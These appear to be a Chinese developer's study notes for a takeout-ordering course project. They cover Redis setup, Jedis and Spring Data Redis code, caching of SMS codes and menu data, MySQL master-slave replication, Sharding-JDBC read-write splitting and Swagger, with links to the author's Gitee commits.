<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改配置文件</span><br><span class="line">[root@localhost redis-4.0.0]# vim redis.conf </span><br><span class="line">[root@localhost redis-4.0.0]# cd src/</span><br><span class="line">[root@localhost src]# cd ..</span><br><span class="line">[root@localhost redis-4.0.0]# src/redis-server ./redis.conf </span><br><span class="line">6605:C 24 Aug 20:16:52.732 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">6605:C 24 Aug 20:16:52.732 # Redis version=4.0.0, bits=64, commit=00000000, modified=0, pid=6605, just started</span><br><span class="line">6605:C 24 Aug 20:16:52.732 # Configuration loaded</span><br></pre></td></tr></table></figure>

<p>设置密码-修改conf文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">requirepass 123456</span><br><span class="line"></span><br><span class="line">auth password</span><br></pre></td></tr></table></figure>

<p>设置允许远程连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#bind 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.138.100 -p 6379 -a 123456</span><br></pre></td></tr></table></figure>

<p>设置了日志文件位置在：&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis.log</p>
<h3 id="Redis数据类型"><a href="#Redis数据类型" class="headerlink" title="Redis数据类型"></a>Redis数据类型</h3><p><a href="https://www.runoob.com/redis/redis-tutorial.html">Redis 教程 | 菜鸟教程 (runoob.com)</a></p>
<h3 id="JAVA中操作redis-jedis"><a href="#JAVA中操作redis-jedis" class="headerlink" title="JAVA中操作redis-jedis"></a>JAVA中操作redis-jedis</h3><p> 简单demo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void testRedis()&#123;</span><br><span class="line">    //1 获取连接</span><br><span class="line">    Jedis jedis = new Jedis(&quot;192.168.138.100&quot;,6379);</span><br><span class="line">    jedis.auth(&quot;123456&quot;);</span><br><span class="line">    //2 执行具体的操作</span><br><span class="line">    jedis.set(&quot;username&quot;,&quot;xiaoming&quot;);</span><br><span class="line"></span><br><span class="line">    String value = jedis.get(&quot;username&quot;);</span><br><span class="line">    System.out.println(value);</span><br><span class="line"></span><br><span class="line">    //jedis.del(&quot;username&quot;);</span><br><span class="line"></span><br><span class="line">    jedis.hset(&quot;myhash&quot;,&quot;addr&quot;,&quot;bj&quot;);</span><br><span class="line">    String hValue = jedis.hget(&quot;myhash&quot;, &quot;addr&quot;);</span><br><span class="line">    System.out.println(hValue);</span><br><span class="line"></span><br><span class="line">    Set&lt;String&gt; keys = jedis.keys(&quot;*&quot;);</span><br><span class="line">    for (String key : keys) &#123;</span><br><span class="line">        System.out.println(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //3 关闭连接</span><br><span class="line">    jedis.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于maven依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.8.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<h3 id="JAVA中操作redis-spring-data-redis"><a href="#JAVA中操作redis-spring-data-redis" class="headerlink" title="JAVA中操作redis-spring data redis"></a>JAVA中操作redis-spring data redis</h3><p>提供功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Data Redis中提供了一个高度封装的类:RedisTemplate，针对jedis客户端中大量api进行了归类封装,将同一类型操作封装为operation接口，具体分类如下:</span><br><span class="line">ValueOperations;简单K-V操作</span><br><span class="line">SetOperations:set类型数据操作</span><br><span class="line">ZSetoperations:zset类型数据操作</span><br><span class="line">HashOperations:针对map类型的数据操作</span><br><span class="line">ListOperations:针对list类型的数据操作</span><br></pre></td></tr></table></figure>



<p>application.yml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: springdataredis_demo</span><br><span class="line">  #Redis相关配置</span><br><span class="line">  redis:</span><br><span class="line">    host: 192.168.138.100</span><br><span class="line">    port: 6379</span><br><span class="line">    password: 123456</span><br><span class="line">    database: 0 #操作的是0号数据库</span><br><span class="line">    jedis:</span><br><span class="line">      #Redis连接池配置</span><br><span class="line">      pool:</span><br><span class="line">        max-active: 8 #最大连接数</span><br><span class="line">        max-wait: 1ms #连接池最大阻塞等待时间</span><br><span class="line">        max-idle: 4 #连接池中的最大空闲连接</span><br><span class="line">        min-idle: 0 #连接池中的最小空闲连接</span><br></pre></td></tr></table></figure>

<p>config</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> <span class="keyword">extends</span> <span class="title class_">CachingConfigurerSupport</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;Object, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory connectionFactory)</span> &#123;</span><br><span class="line"></span><br><span class="line">        RedisTemplate&lt;Object, Object&gt; redisTemplate = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//默认的Key序列化器为：JdkSerializationRedisSerializer</span></span><br><span class="line">        redisTemplate.setKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line">        redisTemplate.setHashKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line"></span><br><span class="line">        redisTemplate.setConnectionFactory(connectionFactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.DataType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringDataRedisTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 操作String类型数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testString</span><span class="params">()</span>&#123;</span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;city123&quot;</span>,<span class="string">&quot;beijing&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String) redisTemplate.opsForValue().get(<span class="string">&quot;city123&quot;</span>);</span><br><span class="line">        System.out.println(value);</span><br><span class="line"></span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>,<span class="number">10l</span>, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> redisTemplate.opsForValue().setIfAbsent(<span class="string">&quot;city1234&quot;</span>, <span class="string">&quot;nanjing&quot;</span>);</span><br><span class="line">        System.out.println(aBoolean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 操作Hash类型数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHash</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">HashOperations</span> <span class="variable">hashOperations</span> <span class="operator">=</span> redisTemplate.opsForHash();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//存值</span></span><br><span class="line">        hashOperations.put(<span class="string">&quot;002&quot;</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line">        hashOperations.put(<span class="string">&quot;002&quot;</span>,<span class="string">&quot;age&quot;</span>,<span class="string">&quot;20&quot;</span>);</span><br><span class="line">        hashOperations.put(<span class="string">&quot;002&quot;</span>,<span class="string">&quot;address&quot;</span>,<span class="string">&quot;bj&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> (String) hashOperations.get(<span class="string">&quot;002&quot;</span>, <span class="string">&quot;age&quot;</span>);</span><br><span class="line">        System.out.println(age);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得hash结构中的所有字段</span></span><br><span class="line">        <span class="type">Set</span> <span class="variable">keys</span> <span class="operator">=</span> hashOperations.keys(<span class="string">&quot;002&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Object key : keys) &#123;</span><br><span class="line">            System.out.println(key);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得hash结构中的所有值</span></span><br><span class="line">        <span class="type">List</span> <span class="variable">values</span> <span class="operator">=</span> hashOperations.values(<span class="string">&quot;002&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Object value : values) &#123;</span><br><span class="line">            System.out.println(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 操作List类型的数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testList</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ListOperations</span> <span class="variable">listOperations</span> <span class="operator">=</span> redisTemplate.opsForList();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//存值</span></span><br><span class="line">        listOperations.leftPush(<span class="string">&quot;mylist&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        listOperations.leftPushAll(<span class="string">&quot;mylist&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        List&lt;String&gt; mylist = listOperations.range(<span class="string">&quot;mylist&quot;</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (String value : mylist) &#123;</span><br><span class="line">            System.out.println(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得列表长度 llen</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">size</span> <span class="operator">=</span> listOperations.size(<span class="string">&quot;mylist&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">lSize</span> <span class="operator">=</span> size.intValue();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; lSize; i++) &#123;</span><br><span class="line">            <span class="comment">//出队列</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">element</span> <span class="operator">=</span> (String) listOperations.rightPop(<span class="string">&quot;mylist&quot;</span>);</span><br><span class="line">            System.out.println(element);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 操作Set类型的数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSet</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SetOperations</span> <span class="variable">setOperations</span> <span class="operator">=</span> redisTemplate.opsForSet();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//存值</span></span><br><span class="line">        setOperations.add(<span class="string">&quot;myset&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        Set&lt;String&gt; myset = setOperations.members(<span class="string">&quot;myset&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String o : myset) &#123;</span><br><span class="line">            System.out.println(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除成员</span></span><br><span class="line">        setOperations.remove(<span class="string">&quot;myset&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        myset = setOperations.members(<span class="string">&quot;myset&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String o : myset) &#123;</span><br><span class="line">            System.out.println(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 操作ZSet类型的数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testZset</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ZSetOperations</span> <span class="variable">zSetOperations</span> <span class="operator">=</span> redisTemplate.opsForZSet();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//存值</span></span><br><span class="line">        zSetOperations.add(<span class="string">&quot;myZset&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="number">10.0</span>);</span><br><span class="line">        zSetOperations.add(<span class="string">&quot;myZset&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="number">11.0</span>);</span><br><span class="line">        zSetOperations.add(<span class="string">&quot;myZset&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="number">12.0</span>);</span><br><span class="line">        zSetOperations.add(<span class="string">&quot;myZset&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="number">13.0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        Set&lt;String&gt; myZset = zSetOperations.range(<span class="string">&quot;myZset&quot;</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (String s : myZset) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改分数</span></span><br><span class="line">        zSetOperations.incrementScore(<span class="string">&quot;myZset&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="number">20.0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        myZset = zSetOperations.range(<span class="string">&quot;myZset&quot;</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (String s : myZset) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除成员</span></span><br><span class="line">        zSetOperations.remove(<span class="string">&quot;myZset&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        myZset = zSetOperations.range(<span class="string">&quot;myZset&quot;</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (String s : myZset) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通用操作，针对不同的数据类型都可以操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testCommon</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//获取Redis中所有的key</span></span><br><span class="line">        Set&lt;String&gt; keys = redisTemplate.keys(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String key : keys) &#123;</span><br><span class="line">            System.out.println(key);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断某个key是否存在</span></span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">itcast</span> <span class="operator">=</span> redisTemplate.hasKey(<span class="string">&quot;itcast&quot;</span>);</span><br><span class="line">        System.out.println(itcast);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除指定key</span></span><br><span class="line">        redisTemplate.delete(<span class="string">&quot;myZset&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取指定key对应的value的数据类型</span></span><br><span class="line">        <span class="type">DataType</span> <span class="variable">dataType</span> <span class="operator">=</span> redisTemplate.type(<span class="string">&quot;myset&quot;</span>);</span><br><span class="line">        System.out.println(dataType.name());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="缓存优化-环境搭建"><a href="#缓存优化-环境搭建" class="headerlink" title="缓存优化 - 环境搭建"></a>缓存优化 - 环境搭建</h3><p>用户数量多，系统访问量大频繁访问数据库，系统性能下降，用户体验差</p>
<h3 id="缓存优化-环境搭建-1"><a href="#缓存优化-环境搭建-1" class="headerlink" title="缓存优化 - 环境搭建"></a>缓存优化 - 环境搭建</h3><p>建立git仓库，提交代码master分支</p>
<p>缓存代码分支改成v1.0-&gt;提交分支到码云</p>
<p>v1.0没问题在合并到master分支</p>
<p>maven坐标</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring:</span><br><span class="line">	redis:</span><br><span class="line">    	host: 192.168.138.100</span><br><span class="line">    	port: 6379</span><br><span class="line">    	password: root@123456</span><br><span class="line">    	database: 0</span><br></pre></td></tr></table></figure>

<p>redis config文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> <span class="keyword">extends</span> <span class="title class_">CachingConfigurerSupport</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;Object, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory connectionFactory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;Object, Object&gt; redisTemplate = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//默认的Key序列化器为：JdkSerializationRedisSerializer</span></span><br><span class="line">        redisTemplate.setKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line">        redisTemplate.setConnectionFactory(connectionFactory);</span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="缓存优化-缓存短信验证码"><a href="#缓存优化-缓存短信验证码" class="headerlink" title="缓存优化 - 缓存短信验证码"></a>缓存优化 - 缓存短信验证码</h3><p>之前短信验证码存在session（默认30分钟），现在改造</p>
<p>实现思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前面我们已经实现了移动端手机验证码登录，随机生成的验证码我们是保存在HttpSession中的。现在需要改造为将验证码缓存在Redis中，具体的实现思路如下:</span><br><span class="line">1、在服务端UserController中注入RedisTemplate对象，用于操作Redis</span><br><span class="line">2、在服务端UserController的sendMsg方法中，将随机生成的验证码缓存到Redis中，并设置有效期为5分钟</span><br><span class="line">3、在服务端UserController的login方法中，从Redis中获取缓存的验证码，如果登录成功则删除Redis中的验证码</span><br></pre></td></tr></table></figure>

<p>修改部分commit-<a href="https://gitee.com/xiong-changchun/reggie_take_out/commit/2458e59720d3e4142cbea4067f5818c389fee72d">短信缓存优化 · 2458e59 · changchun&#x2F;reggie_take_out - Gitee.com</a></p>
<p>增加commit-<a href="https://gitee.com/xiong-changchun/reggie_take_out/commit/c5390559e254bc8a1e2b6eb094b88e19c75ad3bc">增加发送短信逻辑，避免一分钟发送多条短信短信轰炸 · c539055 · changchun&#x2F;reggie_take_out - Gitee.com</a></p>
<h3 id="缓存菜品数据-代码改造缓存菜品数据"><a href="#缓存菜品数据-代码改造缓存菜品数据" class="headerlink" title="缓存菜品数据-代码改造缓存菜品数据"></a>缓存菜品数据-代码改造缓存菜品数据</h3><p>实现思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前面我们已经实现了移动端菜品查看功能，对应的服务端方法为DishController的list方法，此方法会根据前端提交的查询条件进行数据库查询探作。在高并发的情况下，频繁查询数据库会导致系统性能下降，服务响应时间增长。现在需要对此方法进行缓存优化，提高系统的性能。具体的实现思路如下:</span><br><span class="line">1、改造DlshController的list方法，先从Redls中获取菜品数据，如果有则直接返回，无需查询数据库;如果没有则查询数据库，并将查询到的菜品数据放入Redis。</span><br><span class="line">2、改造Dishcontroller的save和update方法，加入清理缓存的逻辑（在使用缓存过程中，要注意保证数据库中的数据和缓存中的数据一致，如果数据库中的数据发生变化，需要及时清理缓存数据。）</span><br></pre></td></tr></table></figure>

<p>修改部分commit-<a href="https://gitee.com/xiong-changchun/reggie_take_out/commit/dcaa933a4179919bc6512fc0908bac1567c69806"><a href="https://gitee.com/xiong-changchun/reggie_take_out/commit/446c186e682c6312ef38d6c624ea4ac978199bf7">菜品缓存优化 · 446c186 · changchun&#x2F;reggie_take_out - Gitee.com</a></a></p>
<h3 id="缓存菜品数据-清理缓存菜品数据"><a href="#缓存菜品数据-清理缓存菜品数据" class="headerlink" title="缓存菜品数据-清理缓存菜品数据"></a>缓存菜品数据-清理缓存菜品数据</h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前面我们已经实现了移动端菜品查看功能，对应的服务端方法为DishController的list方法，此方法会根据前端提交的查询条件进行数据库查询操作。在高并发的情况下，频繁查询数据库会导致系统性能下降，服务端响应时间增长。现在需要对此方法进行缓存优化，提高系统的性能。具体的实现思路如下:</span><br><span class="line">1、改造DishControler的list方法，先从Redis中获取菜品数据，如果有则直接返回，无需查询数据库;如果没有则查询数据库，并将查询到的菜品数据放入Redis。</span><br><span class="line">2、改造DishController的save和update方法，加入清理缓存的逻辑</span><br></pre></td></tr></table></figure>

<p>修改部分commit-<a href="https://gitee.com/xiong-changchun/reggie_take_out/commit/78a7c033524e1d21806a9b43ab0a74d8b38aab93">缓存菜品数据-清理缓存菜品数据 · 78a7c03 · changchun&#x2F;reggie_take_out - Gitee.com</a></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="缓存套餐数据-使用spring-chahe"><a href="#缓存套餐数据-使用spring-chahe" class="headerlink" title="缓存套餐数据-使用spring chahe"></a>缓存套餐数据-使用spring chahe</h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前面我们已经实现了移动端套餐查看功能，对应的服务端方法为Setmealcontroller的list方法，此方法会根据前端提交的查询条件进行数据库查询操作。在高并发的情况下，频繁查询数据库会导致系统性能下降，服务端响应时间增长现在需要对此方法进行缓存优化，提高系统的性能。具体的实现思路如下:</span><br><span class="line">1、导入Spring Cache和Redis相关maven坐标</span><br><span class="line">2、在application.yml中配置缓存数据的过期时间</span><br><span class="line">3、在启动类上加入@EnableCaching注解，开启缓存注解功能4、在Setmealcontroller的list方法上加入@Cacheable注解</span><br><span class="line">在Setmealcontroller的save和delete方法上加入CacheEvict注解</span><br></pre></td></tr></table></figure>

<p>对应commit-<a href="https://gitee.com/xiong-changchun/reggie_take_out/commit/3343e0796056a7ae1c132da7ef922106e42b3ef9">缓存套餐数据-使用spring chahe · 3343e07 · changchun&#x2F;reggie_take_out - Gitee.com</a></p>
<h3 id="读写分离-mysql主从配置"><a href="#读写分离-mysql主从配置" class="headerlink" title="读写分离-mysql主从配置"></a>读写分离-mysql主从配置</h3><p>直接使用之前得虚拟机使用vmware得克隆即可</p>
<p>准备</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">提前准备好两台服务器，分别安装Mysq1并启动服务成功丰库Master 192.168.138.100从库slave 192.168.138.101</span><br></pre></td></tr></table></figure>

<p>配置主库Master</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">第一步:修改Mysql数据库的配置文件/etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin#[必须]启用二进制日志</span><br><span class="line">server-id=100#[必须]服务器唯一ID</span><br><span class="line"></span><br><span class="line">第二步重启mysql</span><br><span class="line">systemctl restart mysqld</span><br><span class="line"></span><br><span class="line">第三步:登录Mysql数据库，执行下面SQL</span><br><span class="line">GRANT REPLICATION SLAVE ON *.* to &#x27;xiaoming&#x27;@&#x27;%&#x27; identified by &#x27;Root@123456&#x27;;</span><br><span class="line">注:上面SQL的作用是创建一个用户xiaoming，密码为Root@123456，并且给xiaoming用户授予REPLICATION SLAVE权限。常用于建立复制时所需要用到的用户权限，也就是slave必须被master授权具有该权限的用户，才能通过该用户复制。</span><br></pre></td></tr></table></figure>

<p>配置从库Slave</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一步:修改Mysql数据库的配置文件/etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">server-id=101#[必须]服务器唯一ID</span><br><span class="line"></span><br><span class="line">第二步重启mysql</span><br><span class="line">systemctl restart mysqld</span><br><span class="line"></span><br><span class="line">第三步:登录Mysq1数据库，执行下面SQL</span><br><span class="line">change master to master_host=&#x27;192.168.138.100&#x27;,master_user=&#x27;xiaoming&#x27;,master_password=&#x27;Root@123456&#x27;,master_log_file=&#x27;mysql-bin.000001&#x27;,master_log_pos=441;   #根据具体情况改</span><br><span class="line">start slave;</span><br><span class="line"></span><br><span class="line">第四步：</span><br><span class="line">show slave status;</span><br></pre></td></tr></table></figure>

<p>坑点因为是slave 是复制得master得镜像，uuid相同：Fatal error: The slave I&#x2F;O thread stops because master and slave have equal MySQL server UUIDs; these UUIDs must be different for replication to work。需要删除uuid文件或者手动修改uuid</p>
<h3 id="项目实现读写分离"><a href="#项目实现读写分离" class="headerlink" title="项目实现读写分离"></a>项目实现读写分离</h3><p>过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在项目中加入Sharding-JDBC实现读写分离步骤:</span><br><span class="line">1、导入maven坐标</span><br><span class="line">2、在配置文件中配置读写分离规则</span><br><span class="line">3、在配置文件中配置允许bean定义覆盖配置项</span><br></pre></td></tr></table></figure>

<p>对应commit-<a href="https://gitee.com/xiong-changchun/reggie_take_out/commit/5d6bdd21854c89e9a616e8265d3159bd673ae558">使用shardingsphere 达成读写分离 · 5d6bdd2 · changchun&#x2F;reggie_take_out - Gitee.com</a></p>
<p>yapi、</p>
<h3 id="swagger配置"><a href="#swagger配置" class="headerlink" title="swagger配置"></a>swagger配置</h3><p>对应commit-<a href="https://gitee.com/xiong-changchun/reggie_take_out/commit/7ddb56eb0c0439891702e61d85b65b20a1a7d702">使用swagger文档 · 7ddb56e · changchun&#x2F;reggie_take_out - Gitee.com</a></p>
